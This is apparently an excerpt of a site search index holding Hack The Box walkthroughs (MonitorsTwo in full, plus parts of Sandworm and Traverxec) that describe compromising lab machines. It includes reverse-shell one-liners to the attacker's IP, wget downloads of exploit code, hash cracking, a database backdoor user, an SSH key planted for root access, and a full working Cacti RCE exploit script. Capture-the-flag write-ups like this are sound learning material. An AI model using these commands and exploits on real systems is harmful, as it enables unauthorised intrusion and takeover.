code, it&rsquo;s probably the wrong move. Yet another plaintext credential enabled the pivot from atlas to silentobserver. It was stored in a .json configuration file for httpie and could have easily just been grepped. Next time, just use a password manager! Credential re-use will always come back to bite. This one can be hard to avoid: don&rsquo;t give one user permissions to a file that affects something that another user should own. Why did silentobserver have the ability to edit lib.rs? If anything, it should have had write permissions from the jailer group. Consider using a firewall for outbound connections. This server probably should have only been able to form outbound connections over HTTP and SSL Sandboxing is neat, but next time just use a container. Firejail seems complicated to configure: using a docker container for the webserver would have been a cleaner solution anyway. `,url:"https://4wayhandshake.github.io/walkthrough/sandworm/"},"https://4wayhandshake.github.io/walkthrough/monitorstwo/":{title:"MonitorsTwo",tags:["CVE","Password Cracking","Lax Capabilities","Docker","OverlayFS"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Upon initial enumeration, the website hosted on MonitorsTwo is something called &ldquo;Cacti&rdquo;, which appears to be a run-of-the-mill website management panel. However, some searching reveals that it is an open-source tool, which gives more detail about its functionality:
Cacti is a complete network graphing solution designed to harness the power of RRDtool&rsquo;s data storage and graphing functionality providing the following features:
Remote and local data collectors Device discovery Automation of device and graph creation Graph and device templating Custom data collection methods User, group and domain access controls Warning: This walkthrough contains many spoilers. No spoilers will be unexpected if you read the walkthrough sequentially.
RECON To begin the box, I ran an nmap port scan. I set RADDR to my target machine&rsquo;s IP, and scanned it as follows:
sudo nmap -p- -O --min-rate 5000 $RADDR Host is up (0.17s latency). Not shown: 64348 closed tcp ports (reset), 1185 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Then I ran a script scan on those two ports:
nmap -sV -sC -n -Pn -p 22,80 $RADDR Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 17:53 IDT Nmap scan report for 10.10.11.211 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Login to Cacti |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Next, I did vhost and subdomain enumeration. Neither yielded any results. I did some banner grabbing:
Since there were no results to vhost / subdomain enumeration, I added monitorstwo.htb to /etc/hosts file and proceeded with directory enumeration. I opened up Burp, added http://monitorstwo.htb to the Burp scope, and ran feroxbuster:
DOMAIN=&#34;boxname.htb&#34; WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts feroxbuster -w $WLIST -u http://$DOMAIN -A -d 1 -t 100 -T 4 --burp -f --auto-tune --collect-words --filter-status 400,401,402,403,404,405 Results showed that it&rsquo;s actually a pretty big target, with lots of pages and documentation included. Here&rsquo;s just the root directory, in Burp:
Knowing a bit about the layout of the site, I decided to check it out in my browser for a bit. I spent some time looking through the /docs in some detail, trying to find some hints about default credentials or about the server&rsquo;s configuration. From index.php we can see that the server is running Cacti v1.2.22
FOOTHOLD RCE from Searchsploit While I did find out a bit about how Cacti works, I didn&rsquo;t see any big obvious hints (the kind that one might expect on an Easy box on HTB). Instead, I turned to searchsploit:
That looks promising! Let&rsquo;s try it out:
Hmm&hellip; Nope. But why didn&rsquo;t it work? I&rsquo;ll ready though the exploit code and try to understand how it works:
less 51166.py Here is the exploit itself:
Ok, so the exploit works by sending a reverse shell to remote_agent.php, enumerating though various local_data_id/host_id combinations until it fints the right one. I can already see a problem with how I ran the exploit, but in case it&rsquo;s not obvious, this is how the exploit is called:
I clearly misinterpreted what the author meant as &ldquo;remote&rdquo; IP and port. I&rsquo;ll do as they suggest, opening a nc listener and using my tun0 IP address and the listener&rsquo;s port. Also, I&rsquo;ll set a new firewall rule for the listener.
I&rsquo;m trying to get out of the script-kiddie habit of always using 4444 for my initial reverse shell and 1337 for my root shell. Instead, I&rsquo;ll use some random port numbers. I&rsquo;ll also open up one for an HTTP server, which I often use for transferring files from my attacker machine to the target. You know what? There is actually a LOT wrong with this exploit. 😳 I went through all the following, all to no avail:
Corrected the shebang Added exception handling to the exploit, to keep running even when it inevitable encounters a TimoutError Parameterized the GET request timeout Re-wrote it to be multi-threaded, because even a timeout of 1s would have taken three hours to enumerate. 🤔 That looked like the right exploit. Oh well, the author did credit the CVE in the comments at the beginning of the script, so instead I&rsquo;ll just search for CVE-2022-46169 online and see if anyone has written a different PoC script.
PoC by @sAsPeCt488 Turns out there are quite a few! This github repo looks pretty good, and clearly uses the same core idea. I&rsquo;ll try it out:
Note that this exploit does not pop a shell, it just provides a single command of RCE. So you can only tell if it worked by creating a reverse shell yourself, or perhaps standing up a webserver and having it wait for a wget/curl request from the target, etc.
I chose to go directly to a reverse shell, because that&rsquo;s how the previous exploit code in 51166.py worked.
python3 CVE-2022-46169.py -c &#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.2/32476 &lt;&amp;1&#39;&#34; --n_host_ids 100 --n_local_data_ids 100 http://$RADDR And&hellip; voila! 🎉 We have a reverse shell:
🐒 This got me wondering why the previous script didn&rsquo;t work.
Doing a quick comparison of the code, it looks like 51166.py mixed up the X-Forwarded-For header with the address of the Cacti server. I corrected this in my modification of 51166.py and tried re-running it, but still no luck: no reverse shell.
I&rsquo;ll have to take a more in-depth look at this later.
Upgrading the Shell I originally learned this procedure from this blog post. It goes into much more depth, but I find that the following is usually sufficient. In only a few rare cases have I had to do more than this.
Starting with the &ldquo;dumb&rdquo; shell, change from sh to bash:
perl -e &#39;exec &#34;/bin/bash&#34;&#39; You&rsquo;ll have a better prompt now, but still no tab completion and still no ability to use things like less or vi. Let&rsquo;s fix that:
[ctrl+z] stty raw -echo; fg [enter] [enter] export TERM=xterm-256color The shell will be backgrounded, then enable echo mode with stty, then brought back to the foreground. This should make the shell much more comfortable to use. Enjoy your tab-completion and colours 🌈.
USER FLAG www-data After entering a system as a new user, it&rsquo;s prudent to see what that user is able to do. I&rsquo;ve landed on a pretty good strategy for this: my User Enumeration Strategy (Linux). For more detail on that, go read through the strategy. For this walkthrough, I&rsquo;ll stick to just going through notable enumeration results:
The only important users on the box are www-data and root. However, www-data doesn&rsquo;t have a home directory, so I wonder who holds the user flag?
Can&rsquo;t run sudo -l. It seems that sudo isn&rsquo;t even on the box..?
Running env reveals several odd environment variables:
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312 APACHE_ENVVARS=/etc/apache2/envvars Several references to C code, mentions of the compiler and compilation flags. The root directory contains a conspicuous file: entrypoint.sh. Inside it, it shows a server startup routine, including a hint at initial database credentials root : root for MySQL. It also mentions reading in initialization data from the very, very juicy-looking script /var/www/html/cacti.sql (examined later). In terms of useful tools, the box only has curl, wget, perl, and php
The box doesn&rsquo;t even have netstat or lsof, so I can&rsquo;t really check for listening processes &#x1f915; If it even had netcat, I could stand up a listener, set up a tunnel to that listener, and run nmap via that tunnel to discover locally-listening services. But nope&hellip;
linpeas pointed out an SUID binary, capsh, that might be useful for PE: It also found a password in a .php file. Probably not important: Contents of cacti.sql Wow this file is really the jackpot. It is a database initialization script, containing all tables and all initial data inserted into those tables. Some important things I found right away were&hellip;
&hellip; When I searched for &lsquo;auth&rsquo; I discovered some user credentials: Those creds are admin : 21232f297a57a5a743894a0e4a801fc3 and guest : 43e9a4ab75570f5b
&hellip; Also discovered when grepping for &lsquo;auth&rsquo; were some SNMP credentials: This shows the SNMP creds are admin : baseball. Also useful is the snmp community: &lsquo;public&rsquo;, and that it uses SNMPv2.
It&rsquo;s worth noting that SNMPv2 could have been brute-forced for this credential. But now we also know the SNMP Auth protocol and SNMP priv protocol (MD5 and DES respectively.)
MySQL I first tried the credentials obtained directly from entrypoint.sh, root : root. I logged in exactly the same as the script did:
mysql --host=db --user=root --password=root cacti And I was met with a valid prompt:
However, I feel like all I was supposed to grab from here is the credentials from the database cacti table user_auth, which I already have from the cacti.sql script. I&rsquo;ll check that they&rsquo;re still there and valid:
Oh? how about that. Not only is the admin password now hashed, we have an additional user named marcus.
Those hashes are&hellip; admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC guest:43e9a4ab75570f5b marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
Since those have changed since cacti.sql ran, I&rsquo;ll also check those SNMP credentials:
Ok, those haven&rsquo;t changed. But it looks like there is now an admin : baseball for snmp_community &lsquo;private&rsquo; as well.
Remember: every time you get new credentials, think about what services you&rsquo;ve encountered that require a login. Try all of those services against all of the credentials you&rsquo;ve obtained so far.
In this box, we&rsquo;ve identified that there are probably three services that have some kind of login: SSH, SNMP, and the webserver.
Given the nature of the database, I think the creds from table user_auth are most likely for the webserver, and admin : baseball is most likely just for SNMP. Good to try all, in case of credential re-use, but I&rsquo;ll begin by checking those creds against their likely services.
First, the webserver:
I tried admin : 21232f297a57a5a743894a0e4a801fc3 and guest : 43e9a4ab75570f5b. No success with either. What about the hashes we just obtained?
hashid $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC Analyzing &#39;$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC&#39; [+] Blowfish(OpenBSD) [+] Woltlab Burning Board 4.x [+] bcrypt Let&rsquo;s try cracking these hashes:
OK, now I know my laptop isn&rsquo;t that great&hellip; but apparently cracking these hashes, even just using rockyou, is going to take a week and a half?!
I&rsquo;ll leave john running while I continue, but for now I think it&rsquo;s best if I explore other options&hellip;
Let&rsquo;s turn this problem upside-down. We already have root access to the database, why not just insert a new credential?
So instead, I&rsquo;ll copy the root record and just give it a new username and password. Probably all the permissions will be the same. First things first, we&rsquo;ll need a new password hash. Thankfully, I found a website to do this:
It looks like the second part of the hash, which is usually the salt, actually identifies the number of rounds of the algorithm. To match the other entries from the database, I chose 10 rounds.
Unfortunately, copying a record but changing a couple fields is not actually the simplest thing to do in SQL (if you don&rsquo;t want to list every column manually). Invoking some SQL-fu, I&rsquo;ll select the admin record into a new table, update a couple values, then select it back into user_auth:
CREATE TABLE user_auth_temp AS SELECT * FROM user_auth WHERE id=1; UPDATE user_auth_temp SET id=5, username=&#34;jimbo&#34;, password=&#34;$2a$10$nZP/YV02tUmZ.TPTIwiCeeh23BPmcad5BfiYlp46ItkHTbp/OGPsa&#34;; INSERT INTO user_auth SELECT * FROM user_auth_temp; DROP TABLE user_auth_temp; Just to check my work:
OK, looks good. I&rsquo;ll try signing in with credentials jimbo : password
Well, partial success. We now know that this login checks the user_auth table, but unfortunately the new user I created is not in the correct groups or something. Surely this can be fixed using only the database&hellip;
MySQL [cacti]&gt; select * from user_auth_group_members; Empty set (0.001 sec) MySQL [cacti]&gt; select * from user_auth_group_perms; Empty set (0.022 sec) MySQL [cacti]&gt; select * from user_auth_group_realm; Empty set (0.000 sec) MySQL [cacti]&gt; select * from user_auth_perms; Empty set (0.003 sec) MySQL [cacti]&gt; select * from user_auth_realm; +----------+---------+ | realm_id | user_id | +----------+---------+ | 1 | 1 | | 2 | 1 | | 3 | 1 | | 4 | 1 | | 5 | 1 | | 7 | 1 | | 8 | 1 | | 9 | 1 | | 10 | 1 | | 11 | 1 | | 12 | 1 | | 13 | 1 | | 14 | 1 | | 15 | 1 | | 16 | 1 | | 17 | 1 | | 18 | 1 | | 19 | 1 | | 20 | 1 | | 21 | 1 | | 22 | 1 | | 23 | 1 | | 24 | 1 | | 25 | 1 | | 26 | 1 | | 27 | 1 | | 28 | 1 | | 101 | 1 | | 1043 | 1 | | 7 | 3 | +----------+---------+ 30 rows in set (0.001 sec) Aha! Ok, so my user is not part of the correct realms. Let&rsquo;s fix that.
INSERT INTO user_auth_realm (realm_id, user_id) SELECT realm_id, 5 FROM user_auth_realm WHERE user_id=1; Now that jimbo is assigned to the correct realms, I&rsquo;ll try logging in again:
Bingo! We&rsquo;re in to the Cacti web interface, logged in as jimbo. Taking a peek at some of the logs, it looks like I was a little noisy trying to log in 😅
Unfortunately, I don&rsquo;t see a flag anywhere inside Cacti. The only notable thing I found was the security settings section:
SNMP Thankfully, this is a protocol I know about from personal experience. It is often used for management of devices across a network. It can be used for data collection, device configuration, and checking the status of equipment. This Hacktricks page goes into much more detail about what can be done just from the CLI to explore SNMP. Firstly, do we have any tools available?
www-data@50bca5e748b0:/tmp/Tools$ which snmpbulkwalk snmpwalk snmp-check /usr/bin/snmpbulkwalk /usr/bin/snmpwalk Excellent, let&rsquo;s try enumerating the available info:
🤔 Hmm&hellip; nothing. Maybe I&rsquo;ll revisit SNMP if I&rsquo;m desperate. For now though, it looks empty.
capsh I&rsquo;ve checked the database, the web interface, and even SNMP&hellip; I feel like I&rsquo;m running out of options. My last lead is this weird SUID binary that linpeas highlighted, called capsh.
First of all, what is capsh even for? It looks like it indirectly assigns capabilities to processes &#x1f644;
* wipes tears with man pages *
I checked the man pages and tried a few things:
capsh --user root capsh --user root /bin/bash capsh -- That last one actually produced a shell, but only under www-data, so I&rsquo;m probably close. I&rsquo;ll check GTFObins to see if there is an easy way to escalate privilege from this.
Perfect. I was pretty close, I just hadn&rsquo;t tried the right flags. I needed to provide user and group flags, then use the -- shell operator:
www-data@50bca5e748b0:/tmp/Tools$ capsh --gid=0 --uid=0 -- There we go! Houston, we have a root shell 🎉
Alright, we didn&rsquo;t find a user flag earlier. Perhaps only root had access to both? Let&rsquo;s look for those flags again:
What?! Still no flags? This is rough 😞
Now that I&rsquo;m a new user, I&rsquo;ll repeat my User Enumeration (Linux) strategy. These are the notable results:
Linpeas reported that I&rsquo;m inside a docker container, and already the root user of that docker container. root has write access to any location. Nothing else meaningful. The relevant Hacktricks article suggested that, if I have the right capabilities set, I might be able to escape the docker container.
🚨 ALERT ALERT ALERT john just cracked a hash!!! We now have a new credential. And, surprise surprise it is NOT a user from this box (a user from within this docker container!):
The credential is marcus : funkymonkey. That gives me a lot of hope. First thing to try then is SSH:
YES!! Finally. And of all things, we have mail! Let&rsquo;s check that out first:
cat /var/mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all, We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team Interesting. Let&rsquo;s look at each of those vulnerabilities:
CVE-2021-33033 Checking uname -a shows that we are using linux kernel 5.4.0-147-generic. So this might be vulnerable. CVE-2020-25706 We already know Cacti is at version 1.2.22, so it is not vulnerable. CVE-2021-41091 Running docker version reveals that the box has docker 20.10.5+dfsg1. It might be vulnerable. OK. Before I dive too deep into that, let me see if we can finally get a user flag 🙏
cat /home/marcus/user.txt Sweet success. Flag obtained. 🍒 🍒 🍒
ROOT FLAG marcus Before I check those CVEs that were hinted at in /var/mail/marcus, I&rsquo;ll do a quick enumeration of the user. Below are any useful results from the user enumeration:
The box has two notable users: marcus and root
marcus has access to nc, netcat, curl, wget, perl, and tmux
netstat revealed some listening processes: I&rsquo;ll be sure to look into ports 8080 and 34731
linpeas (Section &ldquo;Processes, Cron, Services, Timers &amp; Sockets&rdquo;) revealed what might be on 8080 is just the docker container&rsquo;s port 80:
_ /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80 Running curl localhost:8080 from the target box confirms this fact: the result is the Cacti login page.
There are no obvious leads from user enumeration. It is probably time to switch back to that mysterious message at /var/mail/marcus.
CVE-2021-41091 Some quick searching about this CVE landed me at the NIST National Vulnerability Database page describing the CVE. In short, the vulnerability exists in older versions of Moby (Docker Engine). In those older versions, the overlay filesystem used by docker was overly permissive. Sometimes when you run docker containers, you set up volumes where both the host machine and the docker container both have access to the same directory, setting up a mapping between the two of them. This is often in the host system&rsquo;s /var/lib/docker directory.
If the marcus user had privileges to use various docker commands, we could read from the docker configs what mapping exists for the overlay filesystem. However, since overlayfs is a filesystem mounted into the current filesystem, we can see it by checking df -h: A little more searching online shows that a github user @UncleJ4ck has already made a PoC for this CVE. Let&rsquo;s try using it. The instructions are simple:
From within the docker container, as root, set the setuid bit on /bin/bash On the host system, download the PoC code and run it. Since the box is not connected to the internet, I&rsquo;ll need to download the PoC onto my attacker box and serve the code to the target box (using that same python webserver):
From the webserver&rsquo;s directory on my attacker box:
git clone https://github.com/UncleJ4ck/CVE-2021-41091.git tar -czvf CVE-2021-41091.tar.gz CVE-2021-41091 python3 -m http.server 8000 Then from the target box, via SSH as user marcus in any writable directory:
wget http://10.10.14.2:8000/CVE-2021-41091.tar.gz tar -xzvf CVE-2021-41091.tar.gz rm CVE-2021-41091.tar.gz cd CVE-2021-41091 &amp;&amp; exp.sh Unfortunately, it didn&rsquo;t create a shell. However, it did print out some instructions:
So, I changed into that directory and tried running ./bin/bash -p:
🎉 Nice! a root shell! The euid is now set to root.
I&rsquo;ve never seen that kind of privilege escalation before, but it was quite easy! This is definitely going on my list of things to check for whenever I&rsquo;m in a docker container ✅
Now just simply cat out the flag to finish the box.
cat /root/root.txt EXTRA CREDIT SSH as root It&rsquo;s always great to pop a root shell, but in this case we only have the euid set to root. And as a result, I&rsquo;m limited to just one terminal pane within tmux. I know I could easily privilege escalate in the same way on other panes, but for sake of practice I&rsquo;ll try planting a new SSH key as root, and logging in through that - that way I can have a whole tmux session as root.
First, I&rsquo;ll generate a new RSA key on my attacker box. I&rsquo;ve used the passphrase &lsquo;password&rsquo;:
ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in ./id_rsa Your public key has been saved in ./id_rsa.pub The key fingerprint is: SHA256:5dgcDwPs8DrDVKnxmGEmXiFxt37r/M0FztaT78Qrn8k kali@kali The key&#39;s randomart image is: +---[RSA 3072]----+ | o.ooo. | | .oB.+o | | . = %. = | | . =.+* = | | o .S = . . | | = . . o +.| | o . +o=| | o =.o*| | o.. =Eo| +----[SHA256]-----+ Then I&rsquo;ll lock down the permissions on the key. Just for practice I&rsquo;ll also base-64 encode it (so that the whole public key could be copy-pasted through a dumb shell, if need be):
chmod 700 id_rsa base64 -w 0 id_rsa.pub &gt; id_rsa.pub.b64 cat id_rsa.pub.b64 [copy to clipboard] Now, on the target machine (in the euid root shell), echo the public key into /root/.ssh/authorized_keys: I&rsquo;ve omitted the middle part of the pub key so that it can fit on one line, for demonstration purposes
echo &#34;c3NoLXJz...saQo=&#34; | base64 --decode &gt;&gt; /root/.ssh/authorized_keys Then, just log in as root using SSH, using id_rsa and the passphrase used to generate the key:
&#x1f917; Ah yes, so roomy and comfortable&hellip;
Postmortem: RCE from Searchsploit So why was it that 51166.py did not work as RCE? I&rsquo;ve made series of modifications to the original script, and finally got it to work. With each step, I got closer and closer to the PoC code from @saspect.
Below is a summary of the changes I made. Although my eventual success with modifying the script could have been due to any number of the following changes, the final change was using the params property of the httpx.Client object.
Corrected the X-Forwarded-For header to always be 127.0.0.1 instead of the target address (the address of Cacti) Added threading (one thread for each host_id) to make it go really fast. The local_data_ids[] parameter actual accepts a list structure. Instead of using a single number as this parameter, I passed it a 100-element list of range(0,100). Made the RCE command an argument to the program, instead of a hardcoded reverse shell. Changed the way that poller_id contains the payload: swapped out the &lsquo;1&rsquo; for a semicolon: '; /bin/sh -c &quot;{cmd}&quot;' Used the params property of the httpx.Client object, instead of embedding the params into the URL. Here is the code I ended up with, 51166-new.py:
#!/usr/bin/env python3 import random import httpx, urllib from threading import Thread class Exploit: def __init__(self, url, proxy=None, rs_host=&#34;&#34;,rs_port=&#34;&#34;): self.url = url self.session = httpx.Client( headers={&#34;User-Agent&#34;: self.random_user_agent()}, verify=False, proxies=proxy ) self.rs_host = rs_host self.rs_port = rs_port def exploit(self, host_id, timeout_time): local_cacti_ip = self.url.split(&#34;//&#34;)[1].split(&#34;/&#34;)[0] headers = { &#39;X-Forwarded-For&#39;: &#39;127.0.0.1&#39; } payload = f&#39;; /bin/sh -c &#34;{cmd}&#34;&#39; local_data_ids = [x for x in range(0, 100)] params = { &#39;action&#39;: &#39;polldata&#39;, &#39;host_id&#39;: host_id, &#39;poller_id&#39;: payload, &#39;local_data_ids[]&#39;: local_data_ids } url = f&#34;{self.url}/remote_agent.php&#34; try: r = self.session.get(url, params=params, headers=headers, timeout=timeout_time) print(f&#39;\\n\\n\\tSUCCESS: using {r.request}\\n\\n&#39;) print(f&#34;{r.status_code} - {r.text}&#34; ) except Exception as e: print(f&#39;{e}&#39;) def random_user_agent(self): ua_list = [ &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#34;, &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#34;, ] return random.choice(ua_list) def parse_args(): import argparse argparser = argparse.ArgumentParser() argparser.add_argument(&#34;-u&#34;, &#34;--url&#34;, help=&#34;Target URL (e.g. http://192.168.1.100/cacti)&#34;) argparser.add_argument(&#34;-p&#34;, &#34;--remote_port&#34;, help=&#34;reverse shell port to connect to&#34;, required=True) argparser.add_argument(&#34;-i&#34;, &#34;--remote_ip&#34;, help=&#34;reverse shell IP to connect to&#34;, required=True) argparser.add_argument(&#39;-c&#39;, &#34;--command&#34;, help=&#39;Command&#39;, dest=&#39;cmd&#39;) return argparser.parse_args() def exploit_task(url, remote_ip, remote_port, host_id, timeout): e = Exploit(url, None, remote_ip, remote_port) e.exploit(host_id, timeout) args = parse_args() cmd = args.cmd def main() -&gt; None: # Open a nc listener (rs_host+rs_port) and run the script against a CACTI server with its LOCAL IP URL threads = [] timeout = 0.5 # GET timeout, in seconds for n in range(0,100): t = Thread(target=exploit_task, args=(args.url, args.remote_ip, args.remote_port, n, timeout)) threads.append(t) t.start() for t in threads: t.join() if __name__ == &#34;__main__&#34;: main() I hope that helps somebody! Regardless, it was good Python practice 🐍
LESSONS LEARNED Attacker In the Foothold stage, as soon as you identify what service you&rsquo;re trying to get into, check for existing exploits. Especially for Easy boxes, this can be a huge time-saver. Don&rsquo;t get too fixated on the first exploit you find. If one isn&rsquo;t working, go ahead and check the code to see if you made a mistake in using it (many exploits are poorly document and require a bit of reading source code). But if it seems like everything should be working, search for a different exploit for the same vulnerability and try that one. Patience is a virtue. When I first saw the estimate from john about how long it would take to enumerate rockyou with blowfish hashing, I immediately assumed it was the wrong way to go (after all, cracking hashes is seldom the way to go on HTB). I explored every other reasonable lead on the box before I returned, in desperation, to cracking the hashes. In the end, it only took a few minutes because it was such a weak password. If linpeas highlights something, that should be the very first thing you check. I ignored checking the capsh privilege escalation for too long. Perhaps if I had done that first, I wouldn&rsquo;t have gone down the two rabbit-holes of SNMP and gaining access to Cacti. Defender Keep your software updated. This is especially important for public-facing software - on this box, that was Cacti.
Disable password-based authentication for SSH. Key-based authentication (with an encrypted key of course), is only infeasible if you don&rsquo;t know which machines will need to connect to the box. I would argue that if you don&rsquo;t know who needs to connect to the box, it is NOT a candidate for SSH.
Apply security patches. Marcus had already been informed of three CVEs that were on the system, but had only patched one of them. Fixing CVE-2021-41091 would have been just a simple apt upgrade and only caused a few seconds of server downtime.
Use strong passwords accompanied by a good hashing algorithm. Blowfish / bcrypt is pretty good, but the marco user had a very weak password, within the top 1% of rockyou. If they had a stronger password, it would have taken a very long time to crack the hash.
`,url:"https://4wayhandshake.github.io/walkthrough/monitorstwo/"},"https://4wayhandshake.github.io/walkthrough/traverxec/":{title:"Traverxec",tags:["CVE","Nostromo","Common Program Privesc","Password Cracking"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Traverxec is an older box, dating back to 2019, created by a reasonably-famous HTB user named jkr. It prominently features a very minimal webserver called Nostromo. Nostromo is a quick win, reinforcing some key pentesting fundamentals: checking for CVEs and vulnerability recognition while on the local system (after gaining foothold). The procedure for this box is fairly straightforward - a little Linux knowledge will grant the root flag.
I wrote this walkthrough before I had figured out a methodical and consistent way to take notes. Please excuse the haphazard formatting and brevity.
RECON nmap scans [11:05:48] Performing nmap higher-port scan:
# Nmap 7.93 scan initiated Wed Jun 14 11:05:48 2023 as: nmap -p- --min-rate 5000 -oA ./Traverxec/nmap/port-scan 10.10.10.165 Nmap scan report for traverxec.htb (10.10.10.165) Host is up (0.35s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Wed Jun 14 11:06:15 2023 -- 1 IP address (1 host up) scanned in 27.27 seconds [11:06:15] Performing nmap initial scan:
# Nmap 7.93 scan initiated Wed Jun 14 11:06:15 2023 as: nmap -sC -sV -v -n -Pn -oA ./Traverxec/nmap/init-scan 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.19s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa99a81668cd41ccf96c8401c759095c (RSA) | 256 93dd1a23eed71f086b58470973a388cc (ECDSA) |_ 256 9dd6621e7afb8f5692e637f110db9bce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 | http-methods: |_ Supported Methods: GET HEAD POST |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jun 14 11:06:45 2023 -- 1 IP address (1 host up) scanned in 29.59 seconds [11:06:45] HTTP VHost enumeration, using ffuf:
No results [11:12:38] HTTP Directory enumeration for traverxec.htb:
└─$ gobuster dir -w $WLIST -u $RADDR -t 60 --no-error 1 ⨯ =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.165 [+] Method: GET [+] Threads: 60 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/14 15:32:32 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 314] [--&gt; http://10.10.10.165/img/] /js (Status: 301) [Size: 314] [--&gt; http://10.10.10.165/js/] /lib (Status: 301) [Size: 314] [--&gt; http://10.10.10.165/lib/] /icons (Status: 301) [Size: 314] [--&gt; http://10.10.10.165/icons/] /reports list (Status: 501) [Size: 310] /external files (Status: 501) [Size: 310] /style library (Status: 501) [Size: 310] /modern mom (Status: 501) [Size: 310] /neuf giga photo (Status: 501) [Size: 310] FOOTHOLD CVE-2019-16278 The nmap scans show that the webserver is nostromo 1.9.6. Checked searchsploit for that version.
==&gt; Yep there is an exploit! 👏
I took a copy of the exploit. However, I had to modify the exploit very slightly: comment out one line. Change one string to bytes(____,'utf-8') encoding
Next, I opened the firewall, set up a listener, and ran the exploit as follows:
sudo ufw allow from 10.10.10.165 to any port 4444 proto tcp bash nc -lvnp 4444 python3 ./47837.py 10.10.10.165 80 &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.11/4444 0&gt;&amp;1&#39;&#34; 🎉 Got a reverse shell.
USER FLAG User: www-data In an effort to keep this walkthrough brief, I&rsquo;ll only discuss the notable results of user enumeration. To read about my whole user enumeration strategy in detail, please see this page.
Important users are www-data, david, and root:
uid=33(www-data) gid=33(www-data) groups=33(www-data) root:x:0:0:root:/root:/bin/bash sync:x:4:65534:sync:/bin:/bin/sync david:x:1000:1000:david,,,:/home/david:/bin/bash Lots of useful tools are already on the box:
which nc netcat socat curl wget python perl php /usr/bin/nc /usr/bin/netcat /usr/bin/wget /usr/bin/python /usr/bin/perl netstat -tulpn revealed that ONLY port 22 and 80 are listening.
Linpeas found the following hash of a credential:
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ So if I had to guess, this is a login for the admin panel of the webserver or something.
Cracking the Hash Identified the hash using hash-identifier
💡 After writing this walkthrough, I discovered a wonderful new hash identification tool called Name-That-Hash. I highly recommend you go check it out.
